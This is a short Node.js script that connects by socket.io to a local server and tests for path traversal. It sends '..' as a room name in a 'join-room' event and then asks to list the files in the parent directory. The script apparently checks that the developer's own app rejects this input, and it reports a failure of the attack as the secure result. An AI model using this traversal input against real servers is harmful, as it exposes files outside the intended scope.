const { io } = require('socket.io-client');

const socket = io('http://localhost:3002');

socket.on('connect', () => {
    console.log('Connected to server');

    // Attempt to join a "room" that is actually a parent directory
    socket.emit('join-room', '..', 'attacker', (response) => {
        console.log('Join room response:', response);
        if (response.success) {
            console.log('SUCCESS: Path traversal achieved in join-room!');
            
            // Attempt to list files in the parent directory
            socket.emit('file:list', (files) => {
                console.log('Files in parent directory:', files.map(f => f.name));
                socket.disconnect();
                process.exit(0);
            });
        } else {
            console.log('FAILURE: Path traversal failed (expected if secure).', response.error);
            socket.disconnect();
            process.exit(1);
        }
    });
});

socket.on('connect_error', (err) => {
    console.error('Connection error:', err.message);
    process.exit(1);
});
